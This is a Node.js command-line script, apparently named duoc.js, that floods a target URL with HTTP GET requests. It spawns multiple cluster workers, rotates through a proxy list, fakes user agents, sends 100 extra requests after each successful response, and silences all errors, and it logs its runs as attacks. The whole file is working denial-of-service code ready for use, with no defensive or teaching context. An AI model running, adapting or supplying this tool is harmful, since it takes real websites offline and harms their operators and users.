require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request'),
      fs = require('fs'),
      fakeUa = require('fake-useragent'),
      cluster = require('cluster');

async function main_process() {
    if (process.argv.length !== 7) {
        console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
        process.exit(0);
    }

    const target = process.argv[2];
    const time = parseInt(process.argv[3]);
    const threads = parseInt(process.argv[4]);
    const proxyMode = process.argv[5];
    const rate = parseInt(process.argv[6]);

    Array.prototype.remove_by_value = function(val) {
        for (let i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
        }
        return this;
    };

    let proxies = [];

    if (proxyMode === 'bypass') {
        console.log("ATTACK MODE: BYPASS (no proxy)");
    } else {
        console.log(`ATTACK MODE: HTTP_PROXY from file: ${proxyMode}`);
        try {
            const data = fs.readFileSync(proxyMode, 'utf-8');
            proxies = data.replace(/\r/g, '').split('\n').filter(p => p.trim() !== '');
        } catch (err) {
            console.error("Could not read proxy file:", err.message);
            process.exit(1);
        }
    }

    function run() {
        const config = {
            method: 'GET',
            url: target,
            headers: {
                'Cache-Control': 'no-cache',
                'User-Agent': fakeUa()
            }
        };

        if (proxyMode !== 'bypass') {
            if (proxies.length === 0) {
                console.log("No more proxies available.");
                process.exit(0);
            }

            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxiedRequest = request.defaults({ 'proxy': 'http://' + proxy });

            proxiedRequest(config, function (error, response) {
                if (error || !response) {
                    console.warn(`[${proxy}] ERROR: ${error ? error.code : 'No response'} → switching proxy`);
                    proxies = proxies.remove_by_value(proxy);
                    return run(); // retry với proxy khác
                }

                console.log(response.statusCode, "HTTP_PROXY");

                if (response.statusCode >= 200 && response.statusCode <= 226) {
                    for (let i = 0; i < 100; i++) {
                        proxiedRequest(config);
                    }
                } else {
                    console.warn(`[${proxy}] BLOCKED with status ${response.statusCode} → removing`);
                    proxies = proxies.remove_by_value(proxy);
                    return run(); // retry với proxy khác
                }
            });
        } else {
            request(config, function (error, response) {
                if (response) {
                    console.log(response.statusCode, "HTTP_RAW");
                }
            });
        }
    }

    function thread() {
        setInterval(() => {
            for (let i = 0; i < rate; i++) {
                run();
            }
        }, 1000); // Gửi <rate> request mỗi giây
    }

    async function main() {
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
                console.log(`Started thread: ${i + 1}`);
            }
            cluster.on('exit', () => {
                cluster.fork();
            });
        } else {
            thread();
        }
    }

    main();

    setTimeout(() => {
        console.log('Attack End');
        process.exit(0);
    }, time * 1000);
}

process.on('uncaughtException', function () {});
process.on('unhandledRejection', function () {});

main_process();
